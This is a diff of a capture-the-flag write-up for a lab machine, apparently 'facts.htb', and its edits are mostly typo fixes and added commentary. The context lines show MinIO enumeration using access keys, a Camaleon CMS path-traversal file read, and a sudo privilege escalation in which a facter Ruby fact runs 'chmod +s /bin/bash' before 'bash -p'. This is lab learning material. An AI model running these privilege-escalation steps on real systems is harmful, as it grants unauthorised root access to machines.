@@ -105,7 +105,7 @@ aws s3 ls
 2025-09-11 12:06:52 randomfacts
 ```
 
-Got a warning, there's a new version of the aws cli apparently, so I'm gettingthat 
+Got a warning, there's a new version of the aws cli apparently, so I'm getting that.
 ```bash
 sudo pacman -S aws-cli-v2
 aws --version
@@ -160,7 +160,7 @@ Not allowed at this time
 
 ## CVE-2025-62506 Minio Privesc (Red Hering)
 
-The server side of this blob store is minio
+The server side of this blob store is minio, my initial allports nmap scan didn't catch it, probaby because of the high min rate, but that's ok.
 ```bash
 curl -I http://facts.htb:54321
 HTTP/1.1 400 Bad Request
@@ -172,7 +172,7 @@ Vary: Origin
 Date: Mon, 02 Feb 2026 16:48:49 GMT
 ```
 
-Installing and configuring the minio cli
+Installing and configuring the minio cli to maybe get more info.
 ```bash
 mcli alias set facts http://facts.htb:54321 AKIABB4E6613FF38719E liew/et6ulTnpOCG65RJUFBhf9PGTc4F/eO6EvLo
 ```
@@ -188,7 +188,7 @@ jq .aliases.facts ~/.mcli/config.json
 }
 ```
 
-Eventually we're able to find the exact version of minio running
+Eventually we're able to find the exact version of minio running.
 ```bash
 mcli admin info facts
 ●  facts.htb:54321
@@ -215,9 +215,9 @@ python verify_cve_2025_62506.py
 
 ## CVE-2024-46987 Arbitrary File Read
 
-It's time to reassess the situation. An arbitrary file read would be nice, if I could just get /etc/passwd and know what users are on the box I would surely be able to log-in. And I'm pretty sure I saw some kind of arbitrary file read for camaleon while googling around for CVEs.
+It's time to re-assess the situation. An arbitrary file read would be nice, if I could just get /etc/passwd and know what users are on the box I would surely be able to log-in. And I'm pretty sure I saw some kind of arbitrary file read for camaleon while googling around for CVEs.
 
-I eventually found here in the [github advisory](https://github.com/advisories/GHSA-cp65-5m9r-vc2c) that and authenticated user can simply navigated to `download_private_file` and do path traversal in the `file` param. I'm pretty sure I saw that before, I guess I just skipped it because the advisory says `Affected versions < 2.8.1` also maybe I wasn't an authenticated user yet when I checked. Later I also found that I just had to to hit show more in the [vulners article](https://vulners.com/githubexploit/5BEA2FBA-F991-5925-A9FC-6F664099897B) to get a helper script... I guess I really need to spend more than 3 sec per pages sometimes.
+I eventually found here in the [github advisory](https://github.com/advisories/GHSA-cp65-5m9r-vc2c) that an authenticated user can simply navigate to `download_private_file` and do path traversal in the `file` param. I'm pretty sure I saw that before, I guess I just skipped it because the advisory says `Affected versions < 2.8.1` also maybe I wasn't an authenticated user yet when I checked. Later I also found that I just had to to hit show more in the [vulners article](https://vulners.com/githubexploit/5BEA2FBA-F991-5925-A9FC-6F664099897B) to get a helper script... I guess I really need to spend more than 3 sec per pages sometimes.
 
 But we don't really need a script like...
 ```bash
@@ -294,17 +294,19 @@ User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
 ```
 
+Facter is a ruby thing part of the Puppet / Hiera echosystem.
 ```bash
 trivia@facts:~$ sudo /usr/bin/facter --version
 4.10.0
 ```
 
+It gathers system info facts as ruby variables that Puppet can use
 ```bash
 sudo /usr/bin/facter --json
 wl-paste > facter.json
 ```
 
-Facter is a GTFO bin, with a bit of tinkering we can get it to load a script.
+Turns out facter is also a GTFO bin, with a bit of tinkering we can get it to load a script.
 ```bash
 cat /dev/shm/bork.rb
 Facter.add(:its_factual) do setcode { system("chmod +s /bin/bash") } end
@@ -323,11 +325,4 @@ ls -l /bin/bash
 ```bash
 bash -p
 ```
-
-```bash
-```
-
-```bash
-```
-
 
